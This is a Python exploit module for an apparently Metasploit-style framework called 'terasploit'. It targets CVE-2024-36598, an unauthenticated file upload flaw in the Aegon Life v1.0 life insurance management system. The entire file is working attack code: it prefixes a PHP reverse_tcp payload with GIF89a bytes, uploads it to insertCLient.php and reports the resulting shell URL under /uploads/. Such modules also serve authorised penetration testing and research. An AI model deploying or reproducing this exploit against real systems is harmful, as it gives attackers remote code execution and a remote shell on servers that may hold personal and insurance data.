#######
# Module/Exploit: Life Insurance Management System Unauthenticated RCE
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Name'     : 'Life Insurance Management System Unauthenticated RCE',
                'Version'  : 'Aegon Life v1.0',
                "Payload"  : "modules/payload/php/reverse_tcp",
                'Module'   : Module.exploit,
                "Platform" : Platform.PHP,
                "Arch"     : Arch.PHP,
                'Authors'  : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                    'Aslam Anwar Mahimkar'
                ],
                'Description' : [
                    'An arbitrary file upload vulnerability in Aegon Life v1.0',
                    'allows attackers to execute arbitrary code via uploading a ',
                    'crafted PHP file by adding image/gif bytes in payload.'
                ],
                'References' : [
                    'CVE-2024-36598',
                    'https://www.exploit-db.com/exploits/52045',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-36598'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',[
            OptURL.new('target',['','yes','url of the target']),
            OptString.new('path',['/lims/','yes','url path to attempt the upload']),
        ])


    def exploit(self) -> tuple[str, bool]:
        payload, _ = Get.payload()
        target, path = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f"{Target.scheme}://{Target.hostname}/{path.rstrip('/').lstrip('/')}/uploads/{rand}.php")        

        try:
            exploit = HTTPClient.Request('post',
                url=f"{Target.scheme}://{Target.hostname}/{path.rstrip('/').lstrip('/')}/insertCLient.php",
                files={'fileToUpload': (rand + '.php', f"GIF89a;'{shell}'", 'text/php')},
                data={'agent_id':''},
                verify=False
            )
            
            if exploit.status_code in self.good_status_code():
                info_print (f'Shell uploaded: {Shell.get()}', type="GREEN")
                return 'session', True
            else:
                info_print (f'Exploit failed, status code: {exploit.status_code}',type='red')
                return 'session', False
            
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True